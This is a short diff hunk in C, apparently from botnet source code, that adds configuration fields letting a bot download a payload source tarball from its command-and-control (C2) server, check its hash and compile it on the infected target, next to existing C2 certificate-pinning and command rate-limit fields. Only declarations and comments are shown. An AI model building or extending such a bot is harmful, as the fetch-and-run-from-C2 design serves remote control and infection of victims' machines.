@@ -172,6 +172,14 @@ typedef struct {
      * NOTNET_TLS_CERT_PIN_SHA256. Empty = TLS not activated. */
     char tls_cert_pin_sha256[65];
 
+    /* On-target compilation (#69/#81): when binary download fails or the
+     * payload pin mismatches, the bot can fetch the source tarball from
+     * the C2, verify it against payload_source_sha256 (fail-closed), and
+     * compile locally. All three are required for the fallback to run. */
+    uint8_t payload_compile_enabled;
+    char payload_source_url[512];
+    char payload_source_sha256[65];
+
     /* SECURITY FIX (#14): Rate limiting for C2 commands */
     time_t last_cmd_time;
     int cmd_this_second;
